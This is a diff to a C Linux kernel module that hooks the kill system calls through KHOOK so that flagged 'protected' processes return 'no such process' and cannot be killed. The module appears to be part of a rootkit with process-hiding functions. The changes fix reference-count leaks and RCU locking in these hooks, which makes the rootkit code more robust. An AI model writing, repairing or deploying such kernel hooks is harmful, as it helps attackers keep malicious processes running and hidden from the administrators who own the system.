@@ -5,6 +5,7 @@
 #include <linux/uaccess.h> // copy_from_user
 #include <linux/pid.h> // find_get_pid, put_pid, get_pid_task
 #include <linux/sched.h> // find_task_by_vpid
+#include <linux/sched/task.h> // put_task_struct
 #include <linux/cred.h> // copy_creds, exit_creds
 #include <linux/slab.h> // kmalloc, kfree
 #include <linux/stat.h> // struct kstat
@@ -29,6 +30,8 @@ static int protect_process(unsigned int pid) {
         goto err;
     }
     pid_task->flags |= PROTECT_PROCESS_FLAG;
+    put_task_struct(pid_task);
+    put_pid(pid_pointer);
     rcu_read_unlock();
     return 0;
 
@@ -59,6 +62,7 @@ int protect_process_hiding_request(void *raw_subargs) {
 
 KHOOK_EXT(long, sys_kill, long,long);
 static long khook_sys_kill(long pid, long sig) {
+    rcu_read_lock();
     struct pid *pid_pointer = find_get_pid(pid);
     if (pid_pointer == NULL) {
         goto err;
@@ -68,16 +72,30 @@ static long khook_sys_kill(long pid, long sig) {
         goto err;
     }
     if (is_task_struct_protected(pid_task)) {
+        put_task_struct(pid_task);
+        put_pid(pid_pointer);
+        rcu_read_unlock();
         return -ESRCH;
     }
+    put_task_struct(pid_task);
+    put_pid(pid_pointer);
+    rcu_read_unlock();
     return KHOOK_ORIGIN(sys_kill, pid, sig);
     
     err:
+    if (pid_pointer != NULL) {
+        put_pid(pid_pointer);
+    }
+    rcu_read_unlock();
     return 1;
 }
 
 KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs*);
 static long khook___x64_sys_kill(const struct pt_regs* regs) {
+    if (regs == NULL || regs->si == 0) {
+        return KHOOK_ORIGIN(__x64_sys_kill, regs);
+    }
+    rcu_read_lock();
     struct pid *pid_pointer = find_get_pid(regs->di);
     if (pid_pointer == NULL) {
         goto err;
@@ -87,10 +105,20 @@ static long khook___x64_sys_kill(const struct pt_regs* regs) {
         goto err;
     }
     if (is_task_struct_protected(pid_task)) {
+        put_task_struct(pid_task);
+        put_pid(pid_pointer);
+        rcu_read_unlock();
         return -ESRCH; // 显示没有该进程
     }
+    put_task_struct(pid_task);
+    put_pid(pid_pointer);
+    rcu_read_unlock();
     return KHOOK_ORIGIN(__x64_sys_kill, regs);
     
     err:
+    if (pid_pointer != NULL) {
+        put_pid(pid_pointer);
+    }
+    rcu_read_unlock();
     return 1;
 }
